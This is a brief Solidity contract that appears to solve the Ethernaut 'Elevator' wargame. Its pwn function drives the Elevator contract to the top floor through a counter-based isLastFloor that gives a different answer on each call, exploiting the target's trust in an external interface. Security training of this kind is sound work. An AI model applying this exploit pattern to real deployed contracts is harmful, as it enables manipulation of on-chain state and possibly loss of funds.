// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IBuilding, Elevator} from "./Elevator.sol";

contract Building is IBuilding {
    uint count = 0;
    uint topFloor = 10;

    modifier callCount() {
        ++count;
        _;
    }

    function pwn(Elevator elevator) external {
        count = 0;
        elevator.goTo(topFloor);
    }

    function isLastFloor(uint _floor) external callCount returns (bool) {
        return _floor == topFloor && count % 2 == 0;
    }
}
